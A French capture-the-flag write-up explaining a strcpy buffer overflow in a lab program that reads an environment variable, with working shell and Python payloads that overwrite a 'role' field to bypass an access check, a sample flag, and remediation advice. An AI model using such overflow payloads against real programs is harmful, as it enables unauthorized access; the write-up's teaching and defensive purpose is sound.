# St4ck - Write-up (Envir0n)

Ce challenge suit exactement le même pattern que le précédent, mais version "variables d'environnement".

Ce challenge nous fait exploiter le programme `forgot-password` qui utilise une variable d'environnement comme point d'entrée. C'est le même principe que les challenges précédents mais avec une petite twist : l'input ne vient pas du clavier mais d'une variable d'environnement.

Notre mission ? Contourner la restriction de management en utilisant un buffer overflow pour manipuler les variables locales.

---

## Étape 1 : Analyse du code source

Analysons le code source `forgot-password.c` pour voir ce qu'il contient.

**Structure vulnérable :**
```c
struct {
    char hash[151];    // Buffer de 151 octets
    char role[64];     // La variable juste après
} locals = {
    .hash = {0},
    .role = "user"     // Par défaut, simple "user"
};
```

**Ligne dangereuse :**
```c
strcpy(locals.hash, ptr);  // strcpy() sans contrôle de taille
```

**Point d'entrée :**
```c
char *ptr = getenv("DEHASH");  // Le contenu vient d'une variable d'environnement
```

**Condition d'accès :**
```c
if (!strcmp(locals.role, "management")) // Désactivé par le management
    dehash(locals.hash);  // Accès à la fonction de déhashage
else
    printf("This program has been disabled by order of management.\n");  // Message d'erreur
```

---

## Étape 2 : Identification de la vulnérabilité

### Analyse rapide (le cœur de la faille)

**Structure mémoire :**
```c
struct {  
    char hash[151];  
    char role[64];  
} locals;
```
En mémoire :
```
[ hash (151 bytes) ][ role (64 bytes) ]
```

**Ligne dangereuse :**
```c
strcpy(locals.hash, ptr);
```
`ptr` vient de :
```c
getenv("DEHASH");
```

**Donc :**
- Contrôle total de ce qui est copié sans limite
- Possibilité d'overflow `hash` et d'écraser `role`

**Condition critique :**
```c
if (!strcmp(locals.role, "management"))
```
Par défaut :
```c
role = "user"
```
Donc programme bloqué

**La faille :**
- Possibilité d'overflow `hash`
- Possibilité d'écraser `role`

**Objectif :**
Transformer :
```c
role = "user"
```
en :
```c
role = "management"
```

---

## Étape 3 : Construction du payload

### Calcul de l'offset
Calcul de l'offset :
- **Buffer `hash`** : 151 octets
- **Target `role`** : écrire "management" (10 caractères)
- **Payload total** : 151 + 10 = 161 caractères

### Construction du payload
Construction du payload :
```
[151 caractères][management]
```
En langage humain :
```python
"A" * 151 + "management"
```
**Explication :**
- On remplit complètement le buffer `hash` avec 151 'A'
- Puis on écrase `role` avec "management"
- On devient le manager

### Commande finale
Commande finale :
```bash
export DEHASH="$(python3 -c 'print("A"*151 + "management")')"
/opt/intern/forgot-password
```

Ou en une seule commande :
```bash
DEHASH="$(python3 -c 'print("A"*151 + "management")')" ./forgot-password
```

---

## Étape 4 : Résultat attendu

**Résultat attendu :**

**role devient "management"** grâce au buffer overflow

**condition validée** : `strcmp(locals.role, "management")` retourne 0

**appel de :**
```c
dehash(locals.hash);
```

Récupération des données

---

## Bonus : Utilisation de la rainbow table

Bonus avec la rainbow table :

**Dans la fonction `dehash()`, il y a :**
```
{"327a6c4304ad5938eaf0efb6cc3e53dc", "EPI{F4k3_Fl4g_D0_1t_L1v3_N0w}"}
```
et d'autres comme le 
```
{"60d3445af1ae382994cec66b619bd2d8", "<REDACTED>"}
```

Ce hash a déjà été vu dans le challenge précédent.

**Pour l'utiliser :**
```bash
DEHASH="$(python3 -c 'print("327a6c4304ad5938eaf0efb6cc3e53dc" + "A" * (151-32) + "management")')" ./forgot-password
```

### Pourquoi ce calcul `(151-32)` ? 

**Calcul détaillé :**
- **Hash MD5** = 32 caractères
- **Buffer total** = 151 octets
- **Place restante** = 151 - 32 = 119 octets

**Payload spécial :**
```
[32 chars du hash] + [119 chars 'A'] + ["management"]
```

Le hash de 32 caractères prend le début du buffer, puis on remplit le reste (119 'A') pour arriver exactement à 151 caractères avant d'écraser `role` avec "management".

**Calcul vérifié :**
32 (hash) + 119 (padding) + 10 (management) = 161 caractères

---

## Différence avec le challenge précédent

| Aspect | Challenge 3 | Challenge 4 |
|--------|-------------|-------------|
| **Input** | Clavier | Variable d'environnement |
| **Fonction** | `gets()` | `strcpy()` |
| **Variable** | `password` | `hash` |

Même logique : **overflow → overwrite → bypass**

---

## Analyse de la Vulnérabilité

### Nom de la vulnérabilité
**Buffer Overflow via variable d'environnement avec manipulation de variables locales**

### Description technique
Un buffer overflow se produit lorsqu'un programme écrit plus de données que la taille prévue d'une zone mémoire. Dans ce cas, le programme `forgot-password` utilise `strcpy()` sans vérifier la taille de la variable d'environnement `DEHASH`, permettant ainsi d'écraser des variables adjacentes dans la structure sur la pile.

**Vulnérabilité spécifique :**
- La variable `hash[151]` est remplie avec 151+ caractères depuis `getenv("DEHASH")`
- L'overflow écrase `role[64]` qui se trouve juste après dans la structure
- En écrivant "management" dans `role`, on contourne la condition de sécurité

### Conséquences de cette vulnérabilité

#### Impact sur la sécurité
1. **Contournement de restrictions** : Bypass de la désactivation par management
2. **Accès non autorisé** : Utilisation de la fonction `dehash()` interdite
3. **Exfiltration de données** : Récupération de hashs déhashés
4. **Manipulation d'état** : Modification du rôle de l'utilisateur

#### Scénarios d'attaque possibles
- **Bypass de sécurité** : Contourner les restrictions d'accès
- **Exfiltration de données** : Vol d'informations sensibles (hashs, secrets)
- **Élévation de privilèges** : Obtenir des droits d'accès supérieurs
- **Manipulation de comportement** : Modifier le fonctionnement du programme

---

## Mesures de correction et prévention

### Corrections immédiates
1. **Remplacement de strcpy()** : Utiliser `strncpy()` avec contrôle de taille
2. **Validation des entrées** : Ajouter des contrôles de longueur stricts
3. **Séparation des variables** : Éviter les structures vulnérables

### Mesures de sécurité à long terme

#### Bonnes pratiques de développement
**Remplacer les fonctions dangereuses :**
- `strcpy()`, `gets()`, `sprintf()`
- `strncpy()`, `fgets()`, `snprintf()`

**Exemple de code sécurisé :**
```c
char hash[151];
char *ptr = getenv("DEHASH");
if (ptr && strlen(ptr) < sizeof(hash)) {
    strncpy(hash, ptr, sizeof(hash) - 1);
    hash[sizeof(hash) - 1] = '\0';
}
```

#### Protections système
- **ASLR** (Address Space Layout Randomization)
- **NX / DEP** (Non-Executable Memory)
- **Stack Canaries**
- **Fortify Source**

#### Sécurité applicative
- **Validation stricte** des variables d'environnement
- **Tests de robustesse** (fuzzing)
- **Audit de code** régulier
- **Analyse statique** automatisée

---

## Bonnes pratiques générales

### A faire
- **Valider toutes les entrées** (y compris les variables d'environnement)
- **Utiliser des fonctions sécurisées** pour la manipulation de chaînes
- **Mettre en place des audits de sécurité** réguliers
- **Séparer les données sensibles** dans des structures distinctes

### A éviter
- **Utiliser des fonctions non sécurisées** comme `strcpy()`
- **Négliger les contrôles de taille** des buffers
- **Faire confiance aux variables d'environnement**
- **Ignorer les warnings** du compilateur

---

**Mission accomplie** : Le quatrième challenge a été résolu avec succès.

## Résumé
Tu n'as pas "hacké" le programme, tu lui as changé son rôle avant qu'il ne prenne sa décision.

**Ce que ce challenge teste :**
- Comment faire un overflow avec `strcpy()`
- Comment overwrite une variable précise (le role)
- Comment utiliser `getenv` comme porte d'entrée

**Différence avec le challenge précédent :**
| Avant | Maintenant |
|-------|------------|
| input clavier | variable d'environnement |
| `gets()` | `strcpy()` |
| `password` | `hash` |

Même logique : **overflow → overwrite → bypass**
